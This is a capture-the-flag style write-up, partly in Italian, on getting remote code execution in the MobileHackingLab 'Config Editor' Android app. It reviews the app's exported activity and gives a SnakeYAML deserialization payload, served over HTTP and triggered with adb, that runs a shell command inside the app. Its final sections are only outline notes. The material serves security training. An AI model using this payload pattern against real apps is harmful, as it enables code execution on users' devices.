# Config Editor

Achieve Remote Code Execution via a Config Editor app in Android by exploiting vulnerabilities in a third party library.

## Table of Contents

1. [Look Around](#look-around)
2. [Static Analysis](#static-analysis)
3. [Dynamic Analysis](#dynamic-analysis)
4. [Exploiting](#exploiting)
5. [Shell is the way](#shell-is-the-way)
6. [And now?](#and-now)

## Look Around

L'applicazione viene utilizzata per leggere file con estensione `.yaml`

## Static Analysis

Considerazioni sul file `AndroidManifest.xml`

### Permissions

+ `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE`, `MANAGE_EXTERNAL_STORAGE` , permessi per permettere all'applicazione di potere salvare, leggere e scrivere file sulla memoria esterna `sdcard`
+ `INTERNET` , utilizzata per accedere ad Internet

```xml
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
```

### Implicitly Exported Component

An implicitly exported component could allow access to the component Activity, MainActivity.
In questo caso, l'applicazione gestirà i link con scheme `file://`, `http://` e `https://` e file con estensione  `.yaml`

```xml
       <activity android:name="com.mobilehackinglab.configeditor.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="file"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:mimeType="application/yaml"/>
            </intent-filter>
        </activity>
```

### MainActivity

+ Look into MainActivity and what happen

### SnakeYAML

+ SnakeYaml CVE

### SemGrep

+ SemGrep Rules

## Dynamic Analysis

Sanity check:

1. Crea un file `yaml`
2. Metti in ascolto un listener python sulla porta 8080
3. Simula una connessione http con un file yaml con adb
L'applicazione dovrebbe aprirsi e tenterà di leggere il file (se vuoto, l'output sarà vuoto)

Commands:

```sh
$linux> touch example.yaml
$linux> python3 -m http.server 8080
$linux> adb shell am start -a android.intent.action.VIEW -d  "http://$IP:8080/example.yaml" -n com.mobilehackinglab.configeditor/.MainActivity
```

## Exploiting

```yaml
pwn: !!com.mobilehackinglab.configeditor.LegacyCommandUtil [ "/bin/touch /data/data/com.mobilehackinglab.configeditor/pwn.txt" ]
```

```sh
$linux> touch pwn.yaml
$linux> python3 -m http.server 8080
$linux> adb shell am start -a android.intent.action.VIEW -d  "http://$IP:8080/pwn.yaml" -n com.mobilehackinglab.configeditor/.MainActivity
$linux> adb shell ls /data/data/com.mobilehackinglab.configeditor
output: pwn.txt # in listing file
```

<p align="center">
<img src="assets/pwn.png" width="350"/>
</p>

## Shell is the way

+ RCE yes, but where is the shell? method with c script and dalvikvm method

## And now?

+ Android Kernel Privesc, Sandbox Escape, etc
